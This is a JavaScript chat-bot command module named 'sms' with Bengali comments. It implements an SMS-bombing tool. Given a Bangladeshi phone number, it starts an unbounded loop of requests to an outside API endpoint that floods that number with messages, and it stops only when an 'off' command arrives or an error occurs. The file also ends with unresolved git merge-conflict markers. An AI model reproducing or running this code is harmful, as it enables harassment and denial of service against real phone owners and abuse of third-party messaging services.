module.exports.config = {
  name: "sms",
  version: "2.0.0",
  role: 2,
  author: "𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
  description: "𝚃𝙷𝙸𝚂 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝚂 𝚂𝙿𝙰𝙼𝙼𝙸𝙽𝙶/𝚂𝙼𝚂 𝙾𝙵𝙵🎀",
  category: "Tool",
  guide: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const bombingFlags = {};
 
module.exports.onStart = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];
 
  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage(" 𝚂𝙼𝚂 𝙾𝙵𝙵 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙱𝙾𝚂𝚂🎀।", threadID);
    } else {
      return api.sendMessage("❗𝚃𝙷𝙸𝚂 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝚂 𝙽𝙾𝚃 𝚂𝙿𝙰𝙼", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁 \n\𝚄𝚂𝙴:\n/𝚂𝙼𝚂 01xxxxxxxxx\n\n(𝙾𝙽𝙻𝚈 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷𝙸 𝙽𝚄𝙼𝙱𝙴𝚁,)\n\n", threadID);
  }
 
  if (bombingFlags[threadID]) {
    return api.sendMessage("", threadID);
  }
 
  api.sendMessage(`✅—͟͟͞͞𝚂𝙼𝚂 𝙸𝚂 𝙽𝙾𝚆 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙱𝙾𝚂𝚂- ${number} 𝚃𝙷𝙸𝚂 𝙽𝚄𝙼𝙱𝙴𝚁-🎀\n/𝚂𝙼𝚂 𝙾𝙵𝙵`, threadID);
 
  bombingFlags[threadID] = true;
 
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
<<<<<<< HEAD
};
=======
};
>>>>>>> 5f826bfa37596c145c0dee848e9aff6fc51060d8
